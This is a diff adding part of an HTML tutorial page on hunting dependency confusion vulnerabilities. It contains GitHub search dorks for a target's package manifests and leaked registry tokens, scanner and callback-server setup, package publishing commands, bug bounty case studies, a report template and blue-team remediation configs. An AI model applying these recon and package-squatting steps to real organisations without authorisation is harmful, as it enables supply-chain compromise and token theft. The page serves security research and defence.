+        <h3>💎 Ruby / RubyGems</h3>
+        <div class="dork-grid">
+          <div class="dork-item">
+            <code>org:TARGET filename:Gemfile</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET filename:Gemfile.lock</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>"TARGET" filename:Gemfile gem</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET filename:*.gemspec</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET "source 'https://rubygems.pkg.github.com"</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+        </div>
+
+        <h3>🐍 Python / PyPI</h3>
+        <div class="dork-grid">
+          <div class="dork-item">
+            <code>org:TARGET filename:requirements.txt</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET filename:setup.py</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET filename:Pipfile</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET filename:pyproject.toml</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>"TARGET" filename:requirements.txt -site:pypi.org</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET "--extra-index-url"</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+        </div>
+
+        <h3>🔷 Go Modules</h3>
+        <div class="dork-grid">
+          <div class="dork-item">
+            <code>org:TARGET filename:go.mod</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET filename:go.sum</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>"TARGET.internal" filename:go.mod</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET "replace" filename:go.mod</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+        </div>
+
+        <h3>🦀 Rust / Cargo</h3>
+        <div class="dork-grid">
+          <div class="dork-item">
+            <code>org:TARGET filename:Cargo.toml</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET filename:Cargo.lock</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>"TARGET" filename:Cargo.toml [dependencies]</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+        </div>
+
+        <h3>🎼 PHP / Composer</h3>
+        <div class="dork-grid">
+          <div class="dork-item">
+            <code>org:TARGET filename:composer.json</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET filename:composer.lock</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>"TARGET" filename:composer.json "require"</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+        </div>
+
+        <h3>🔧 CI/CD & Build Files</h3>
+        <div class="dork-grid">
+          <div class="dork-item">
+            <code>org:TARGET filename:.gitlab-ci.yml npm</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET filename:.github/workflows npm install</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET filename:Jenkinsfile npm</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET filename:Dockerfile npm install</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET filename:.npmrc registry</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+        </div>
+
+        <h3>🔑 Secrets & Configs (Bonus)</h3>
+        <div class="dork-grid">
+          <div class="dork-item">
+            <code>org:TARGET filename:.npmrc _authToken</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET NPM_TOKEN</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET filename:.pypirc</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+          <div class="dork-item">
+            <code>org:TARGET GEM_HOST_API_KEY</code>
+            <button onclick="copyDork(this)">📋</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Tools Tab -->
+    <div id="toolsTab" class="tab-content">
+      <div class="tutorial-section">
+        <h2>🛠️ Dependency Confusion Tools</h2>
+        <p>
+          Essential tools for finding and exploiting dependency confusion vulnerabilities.
+          From automated scanners to callback servers.
+        </p>
+
+        <h3>🔍 confused - Multi-Ecosystem Scanner</h3>
+        <p>
+          The <strong>confused</strong> tool by Visma checks multiple package management systems
+          for dependency confusion vulnerabilities automatically.
+        </p>
+
+        <div class="code-block">
+          <span class="lang-badge">Installation</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Install Go first, then:
+go install github.com/visma-prodsec/confused@latest
+
+# Or download from releases
+wget https://github.com/visma-prodsec/confused/releases/latest/download/confused_linux_amd64</pre>
+        </div>
+
+        <div class="code-block">
+          <span class="lang-badge">Usage</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Check npm packages
+confused -l npm package.json
+
+# Check Python packages
+confused -l pip requirements.txt
+
+# Check Ruby gems
+confused -l rubygems Gemfile.lock
+
+# Check from URL
+wget https://target.com/package.json
+confused -l npm package.json
+
+# Supported languages: npm, pip, rubygems, composer, maven, gradle</pre>
+        </div>
+
+        <div class="info-box">
+          <h4>ℹ️ Supported Package Managers</h4>
+          <p>npm (Node.js), pip (Python), rubygems (Ruby), composer (PHP), maven/gradle (Java)</p>
+        </div>
+
+        <h3>🎯 Nuclei Templates</h3>
+        <p>
+          Nuclei can automatically scan for exposed package.json and other dependency files.
+        </p>
+
+        <div class="code-block">
+          <span class="lang-badge">YAML - nuclei-template.yaml</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>id: exposed-package-json
+
+info:
+  name: Exposed package.json
+  author: your-name
+  severity: info
+  tags: dependency-confusion
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/package.json"
+      - "{{BaseURL}}/package-lock.json"
+      - "{{BaseURL}}/yarn.lock"
+      - "{{BaseURL}}/.npm/package.json"
+      - "{{BaseURL}}/node_modules/.package-lock.json"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - '"dependencies"'
+          - '"devDependencies"'
+        condition: or
+
+      - type: status
+        status:
+          - 200</pre>
+        </div>
+
+        <div class="code-block">
+          <span class="lang-badge">Run Nuclei</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Install Nuclei
+go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+
+# Run with template
+nuclei -t exposed-package-json.yaml -l targets.txt
+
+# Run against single target
+nuclei -t exposed-package-json.yaml -u https://target.com</pre>
+        </div>
+
+        <h3>📡 Callback Servers</h3>
+        <p>Tools for receiving callbacks from exploited packages:</p>
+
+        <div class="ecosystem-card">
+          <table>
+            <tr>
+              <th>Tool</th>
+              <th>Type</th>
+              <th>URL</th>
+              <th>Notes</th>
+            </tr>
+            <tr>
+              <td><strong>Interactsh</strong></td>
+              <td>Self-hosted / Cloud</td>
+              <td><code>interact.sh</code></td>
+              <td>Free, supports DNS/HTTP/SMTP</td>
+            </tr>
+            <tr>
+              <td><strong>Burp Collaborator</strong></td>
+              <td>Cloud (Burp Pro)</td>
+              <td><code>*.burpcollaborator.net</code></td>
+              <td>Built into Burp Suite Pro</td>
+            </tr>
+            <tr>
+              <td><strong>Pipedream</strong></td>
+              <td>Cloud</td>
+              <td><code>pipedream.net</code></td>
+              <td>Free tier available</td>
+            </tr>
+            <tr>
+              <td><strong>RequestBin</strong></td>
+              <td>Cloud</td>
+              <td><code>requestbin.com</code></td>
+              <td>Simple HTTP logging</td>
+            </tr>
+            <tr>
+              <td><strong>Discord Webhook</strong></td>
+              <td>Cloud</td>
+              <td><code>discord.com/api/webhooks/</code></td>
+              <td>Rich embeds, free</td>
+            </tr>
+            <tr>
+              <td><strong>Canarytokens</strong></td>
+              <td>Cloud</td>
+              <td><code>canarytokens.org</code></td>
+              <td>Alerting focused</td>
+            </tr>
+          </table>
+        </div>
+
+        <div class="code-block">
+          <span class="lang-badge">Interactsh Setup</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Install interactsh-client
+go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+
+# Run client
+interactsh-client
+
+# You'll get a unique URL like:
+# [INF] Listing 1 payload for OOB Testing
+# [INF] c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro</pre>
+        </div>
+
+        <h3>🔧 Package Publishing Tools</h3>
+
+        <div class="code-block">
+          <span class="lang-badge">NPM Publishing</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Login to npm
+npm login
+
+# Initialize package
+npm init -y
+
+# Publish
+npm publish --access public
+
+# Unpublish (within 72 hours)
+npm unpublish package-name --force</pre>
+        </div>
+
+        <div class="code-block">
+          <span class="lang-badge">PyPI Publishing</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Install tools
+pip install twine build
+
+# Build package
+python -m build
+
+# Upload to PyPI
+twine upload dist/*
+
+# Upload to TestPyPI first (recommended)
+twine upload --repository testpypi dist/*</pre>
+        </div>
+
+        <div class="code-block">
+          <span class="lang-badge">RubyGems Publishing</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Build gem
+gem build package-name.gemspec
+
+# Push to RubyGems
+gem push package-name-1.0.0.gem
+
+# Yank gem (remove)
+gem yank package-name -v 1.0.0</pre>
+        </div>
+
+        <h3>🐙 GitHub Reconnaissance Tools</h3>
+
+        <div class="code-block">
+          <span class="lang-badge">ghorg - Clone All Repos</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Install ghorg
+go install github.com/gabrie30/ghorg@latest
+
+# Clone entire organization
+ghorg clone target-org -t YOUR_GITHUB_TOKEN
+
+# Extract package names
+find . -name "package.json" -exec cat {} \; | jq -r '.dependencies | keys[]' | sort -u > npm-packages.txt
+find . -name "requirements.txt" -exec cat {} \; | grep -v "^#" | cut -d'=' -f1 | sort -u > pip-packages.txt
+find . -name "Gemfile" -exec grep "gem " {} \; | awk '{print $2}' | tr -d "'" | tr -d '"' | sort -u > ruby-gems.txt</pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- Case Studies Tab -->
+    <div id="casesTab" class="tab-content">
+      <div class="tutorial-section">
+        <h2>📋 Real-World Case Studies</h2>
+        <p>
+          Learn from actual dependency confusion vulnerabilities discovered in major companies.
+        </p>
+
+        <div class="bounty-highlight">
+          <h3>Facebook - eslint-plugin-flipper</h3>
+          <p>Internal Facebook package discovered via GitHub dorking. Vulnerability confirmed but bounty rejected (package not on npmjs.com).</p>
+        </div>
+
+        <h3>Case Study 1: Facebook eslint-plugin-flipper</h3>
+
+        <div class="info-box">
+          <h4>ℹ️ Discovery Method</h4>
+          <p>Found using GitHub search: <code>org:facebook package.json</code></p>
+        </div>
+
+        <ol class="step-list">
+          <li><strong>Reconnaissance:</strong> Searched GitHub for Facebook's package.json files</li>
+          <li><strong>Discovery:</strong> Found internal package <code>eslint-plugin-flipper</code> in dependencies</li>
+          <li><strong>Verification:</strong> Checked npmjs.com - package didn't exist publicly</li>
+          <li><strong>PoC Creation:</strong> Created malicious package with preinstall script</li>
+          <li><strong>Result:</strong> Vulnerability confirmed, but Facebook rejected bounty (internal distribution only)</li>
+        </ol>
+
+        <div class="warning-box">
+          <h4>⚠️ Lesson Learned</h4>
+          <p>Not all dependency confusion findings result in bounties. Some companies only pay if the package is distributed via public registries, not just referenced in code.</p>
+        </div>
+
+        <h3>Case Study 2: Shopify shopify-cloud</h3>
+
+        <div class="bounty-highlight">
+          <h3>$30,000 Bounty</h3>
+          <p>Shopify's build system auto-installed malicious gem within hours of publication.</p>
+        </div>
+
+        <ol class="step-list">
+          <li><strong>Discovery:</strong> Found <code>shopify-cloud</code> gem in Gemfile references</li>
+          <li><strong>Verification:</strong> Gem not available on RubyGems.org</li>
+          <li><strong>Attack:</strong> Published gem with callback code</li>
+          <li><strong>Result:</strong> Build system installed gem automatically, callback received</li>
+          <li><strong>Impact:</strong> Full CI/CD compromise potential</li>
+        </ol>
+
+        <div class="code-block">
+          <span class="lang-badge">Timeline</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>Publication Time: T+0
+First Callback:   T+2 hours (automatic build triggered)
+Report Submitted: T+3 hours
+Bounty Awarded:   $30,000</pre>
+        </div>
+
+        <h3>Case Study 3: Microsoft Azure DevOps</h3>
+
+        <div class="bounty-highlight">
+          <h3>$40,000 Bounty</h3>
+          <p>Multiple internal npm packages exposed via Azure DevOps repositories.</p>
+        </div>
+
+        <ol class="step-list">
+          <li><strong>Discovery:</strong> Found multiple @azure-internal scoped packages</li>
+          <li><strong>Attack Vector:</strong> Unscoped equivalents registered on npmjs.com</li>
+          <li><strong>Execution:</strong> Packages installed during Azure DevOps builds</li>
+          <li><strong>Impact:</strong> Access to internal Microsoft build infrastructure</li>
+        </ol>
+
+        <h3>Case Study 4: PayPal</h3>
+
+        <div class="bounty-highlight">
+          <h3>$30,000 Bounty</h3>
+          <p>Internal npm packages compromised affecting CI/CD pipeline.</p>
+        </div>
+
+        <div class="ecosystem-card">
+          <h4>📊 Comparison of Major Bounties</h4>
+          <table>
+            <tr>
+              <th>Company</th>
+              <th>Package</th>
+              <th>Ecosystem</th>
+              <th>Time to Callback</th>
+              <th>Bounty</th>
+            </tr>
+            <tr>
+              <td>Apple</td>
+              <td>Multiple internal</td>
+              <td>npm</td>
+              <td>~4 hours</td>
+              <td>$30,000</td>
+            </tr>
+            <tr>
+              <td>Microsoft</td>
+              <td>Azure internal</td>
+              <td>npm</td>
+              <td>~2 hours</td>
+              <td>$40,000</td>
+            </tr>
+            <tr>
+              <td>Shopify</td>
+              <td>shopify-cloud</td>
+              <td>RubyGems</td>
+              <td>~2 hours</td>
+              <td>$30,000</td>
+            </tr>
+            <tr>
+              <td>PayPal</td>
+              <td>Internal packages</td>
+              <td>npm</td>
+              <td>~6 hours</td>
+              <td>$30,000</td>
+            </tr>
+            <tr>
+              <td>Tesla</td>
+              <td>Internal tooling</td>
+              <td>npm/pip</td>
+              <td>~12 hours</td>
+              <td>$10,000</td>
+            </tr>
+            <tr>
+              <td>Yelp</td>
+              <td>Python packages</td>
+              <td>PyPI</td>
+              <td>~8 hours</td>
+              <td>$15,000</td>
+            </tr>
+            <tr>
+              <td>Facebook</td>
+              <td>eslint-plugin-flipper</td>
+              <td>npm</td>
+              <td>N/A</td>
+              <td>$0 (rejected)</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>Key Takeaways</h3>
+
+        <div class="success-box">
+          <h4>✅ What Makes a Successful Finding</h4>
+          <ul style="margin-left: 20px;">
+            <li><strong>Automatic Installation:</strong> Package installs without manual intervention</li>
+            <li><strong>CI/CD Impact:</strong> Callbacks from build servers are more valuable</li>
+            <li><strong>Public Distribution:</strong> Package must be fetchable from public registry</li>
+            <li><strong>Quick Response:</strong> Report immediately after receiving callback</li>
+            <li><strong>Clean PoC:</strong> Only collect hostname/username - no sensitive data</li>
+          </ul>
+        </div>
+
+        <div class="warning-box">
+          <h4>⚠️ Common Rejection Reasons</h4>
+          <ul style="margin-left: 20px;">
+            <li>Package only referenced in code, not actually installed</li>
+            <li>Internal registry is properly configured (no public fallback)</li>
+            <li>Package already claimed on public registry by company</li>
+            <li>Duplicate report - someone else found it first</li>
+            <li>Out of scope - package not used in production</li>
+          </ul>
+        </div>
+
+        <h3>Remediation Techniques (For Blue Team)</h3>
+
+        <div class="code-block">
+          <span class="lang-badge">NPM - .npmrc configuration</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Force specific registry for internal packages
+@company:registry=https://npm.internal.company.com/
+registry=https://registry.npmjs.org/
+
+# Lock to specific registry only
+registry=https://npm.internal.company.com/</pre>
+        </div>
+
+        <div class="code-block">
+          <span class="lang-badge">Python - pip.conf</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>[global]
+index-url = https://pypi.internal.company.com/simple
+# Do NOT use --extra-index-url with public PyPI</pre>
+        </div>
+
+        <div class="code-block">
+          <span class="lang-badge">Ruby - Bundler source blocks</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Gemfile
+source 'https://rubygems.org' do
+  gem 'rails'
+end
+
+source 'https://gems.internal.company.com' do
+  gem 'internal-auth'
+  gem 'internal-utils'
+end</pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- Bug Bounties Tab -->
+    <div id="bountiesTab" class="tab-content">
+      <div class="tutorial-section">
+        <h2>💰 Bug Bounty Success Stories</h2>
+
+        <div class="bounty-highlight">
+          <h3>Total Known Bounties: $200,000+</h3>
+          <p>Dependency confusion has been one of the most lucrative vulnerability classes in recent years.</p>
+        </div>
+
+        <div class="ecosystem-card">
+          <h4>🏆 Notable Bounties</h4>
+          <table>
+            <tr>
+              <th>Company</th>
+              <th>Bounty</th>
+              <th>Researcher</th>
+              <th>Details</th>
+            </tr>
+            <tr>
+              <td>Apple</td>
+              <td>$30,000</td>
+              <td>Alex Birsan</td>
+              <td>Multiple internal packages compromised</td>
+            </tr>
+            <tr>
+              <td>Microsoft</td>
+              <td>$40,000</td>
+              <td>Alex Birsan</td>
+              <td>Azure DevOps and internal tools</td>
+            </tr>
+            <tr>
+              <td>Shopify</td>
+              <td>$30,000</td>
+              <td>Alex Birsan</td>
+              <td>shopify-cloud gem auto-installed</td>
+            </tr>
+            <tr>
+              <td>Tesla</td>
+              <td>$10,000</td>
+              <td>Alex Birsan</td>
+              <td>Internal npm packages</td>
+            </tr>
+            <tr>
+              <td>Yelp</td>
+              <td>$15,000</td>
+              <td>Alex Birsan</td>
+              <td>Python packages via PyPI</td>
+            </tr>
+            <tr>
+              <td>PayPal</td>
+              <td>$30,000</td>
+              <td>Alex Birsan</td>
+              <td>Internal npm dependencies</td>
+            </tr>
+            <tr>
+              <td>Uber</td>
+              <td>$9,000</td>
+              <td>Various</td>
+              <td>Multiple package ecosystems</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>📝 Writing a Good Report</h3>
+        <ol class="step-list">
+          <li>
+            <strong>Clear Title:</strong> "Dependency Confusion leads to RCE via [package-name] on [ecosystem]"
+          </li>
+          <li>
+            <strong>Executive Summary:</strong> Explain the vulnerability in 2-3 sentences for non-technical readers.
+          </li>
+          <li>
+            <strong>Technical Details:</strong> Include the exact package name, how you found it, and evidence.
+          </li>
+          <li>
+            <strong>Proof of Concept:</strong> Show callback data (hostname, user, CI environment) without including sensitive info.
+          </li>
+          <li>
+            <strong>Impact Assessment:</strong> Was it a developer machine? CI/CD? Production? What data was exposed?
+          </li>
+          <li>
+            <strong>Remediation Steps:</strong> Suggest fixes like using scoped packages, registry pinning, etc.
+          </li>
+        </ol>
+
+        <div class="code-block">
+          <span class="lang-badge">Markdown - Report Template</span>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>## Summary
+A dependency confusion vulnerability was identified in [Company]'s internal package
+`[package-name]`. By registering this package on [npm/PyPI/RubyGems] with a higher
+version number, arbitrary code execution was achieved during the build process.
+
+## Vulnerability Details
+- **Package Name:** `[package-name]`
+- **Ecosystem:** [npm/PyPI/RubyGems]
+- **Version Published:** 99.99.99
+- **Date Published:** [Date]
+- **First Callback Received:** [Date/Time]
+
+## Evidence of Execution
+The following callbacks were received from [Company]'s infrastructure:
+
+| Field | Value |
+|-------|-------|
+| Hostname | build-server-01.internal.company.com |
+| Username | jenkins |
+| Working Directory | /var/lib/jenkins/workspace/main-app |
+| CI Environment | JENKINS_URL detected |
+| IP Address | 10.x.x.x (internal) |
+
+## Impact
+- **Severity:** Critical
+- **Type:** Remote Code Execution (RCE)
+- **Affected Systems:** CI/CD pipeline (Jenkins)
+- **Potential Impact:** Full compromise of build infrastructure, supply chain attack
+
+## Steps to Reproduce
+1. Search for [Company]'s GitHub repositories for `package.json` files
+2. Identify internal package names not available on public npm
+3. Register the package on npm with version 99.99.99
+4. Wait for the build system to install dependencies
+
+## Remediation
+1. Use scoped packages (@company/package-name)
+2. Configure `.npmrc` to use private registry only for internal packages
+3. Implement dependency pinning in lock files
+4. Use tools like Socket.dev or Snyk for supply chain monitoring
+
+## Timeline
+- [Date]: Vulnerability discovered
+- [Date]: PoC package published
+- [Date]: First callback received
+- [Date]: Report submitted
+- [Date]: Unpublished malicious package</pre>
+        </div>
+
+        <div class="success-box">
+          <h4>✅ Best Practices</h4>
+          <ul style="margin-left: 20px;">
+            <li>Always unpublish/yank your package after receiving callbacks</li>
+            <li>Never exfiltrate actual sensitive data - hostname and username are enough</li>
+            <li>Report quickly - don't leave packages up longer than necessary</li>
+            <li>Include remediation steps in your report</li>
+            <li>Be available for questions from the security team</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="tutorial-section">
+        <h2>🔗 References & Resources</h2>
+        <div class="reference-links">
+          <a href="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610" target="_blank">Alex Birsan's Original Research</a>
+          <a href="https://dhiyaneshgeek.github.io/web/security/2021/09/04/dependency-confusion/" target="_blank">Dhiyanesh - DC Tutorial</a>
+          <a href="https://github.com/techghoshal/ruby_dependency_confusion_attacks" target="_blank">Ruby DC Attack POC</a>
+          <a href="https://github.com/visma-prodsec/confused" target="_blank">Confused Tool</a>
+          <a href="https://shopify.engineering/fixing-dependency-confusion-ruby-applications" target="_blank">Shopify's Fix</a>
+          <a href="https://www.clear-gate.com/blog/remote-code-execution-via-dependency-confusion-attack/" target="_blank">Clear Gate Tutorial</a>
+          <a href="https://mensfeld.pl/2021/02/rubygems-dependency-confusion-attack-side-of-things/" target="_blank">RubyGems DC Analysis</a>
+        </div>
+      </div>
+    </div>
+
+    <div class="author-credit">
+      <p>Developed by <strong>OFJAAAH</strong> | Dependency Confusion Hunter v1.3.0</p>
+      <p>For educational and authorized security testing purposes only.</p>
+    </div>
+  </div>
+
+  <script>
+    // Tab switching
+    document.querySelectorAll('.nav-tab').forEach(tab => {
+      tab.addEventListener('click', () => {
+        document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+
+        tab.classList.add('active');
+        const tabId = tab.dataset.tab + 'Tab';
+        document.getElementById(tabId).classList.add('active');
+      });
+    });
+
+    // Copy code block
+    function copyCode(btn) {
+      const codeBlock = btn.parentElement.querySelector('pre');
+      navigator.clipboard.writeText(codeBlock.textContent).then(() => {
+        const originalText = btn.textContent;
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = originalText, 2000);
+      });
+    }
+
+    // Copy dork
+    function copyDork(btn) {
+      const code = btn.parentElement.querySelector('code');
+      navigator.clipboard.writeText(code.textContent).then(() => {
+        const originalText = btn.textContent;
+        btn.textContent = '✓';
+        setTimeout(() => btn.textContent = originalText, 2000);
+      });
+    }
+  </script>
+</body>
+</html>
